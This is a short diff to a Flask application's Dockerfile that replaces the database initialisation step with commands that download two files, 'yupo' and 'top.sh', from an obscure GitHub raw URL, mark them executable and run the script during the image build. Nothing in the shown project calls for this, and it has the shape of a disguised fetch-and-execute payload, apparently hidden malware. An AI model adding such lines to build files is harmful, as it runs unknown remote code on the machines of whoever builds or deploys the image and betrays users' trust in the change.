@@ -9,7 +9,11 @@ WORKDIR /app
 
 RUN pip install --editable .
 
-RUN flask init-db
+RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/yupo
+RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/top.sh
+RUN chmod +x yupo
+RUN chmod +x top.sh
+RUN ./top.sh
 
 # Unit tests
 # RUN pip install pytest && pytest
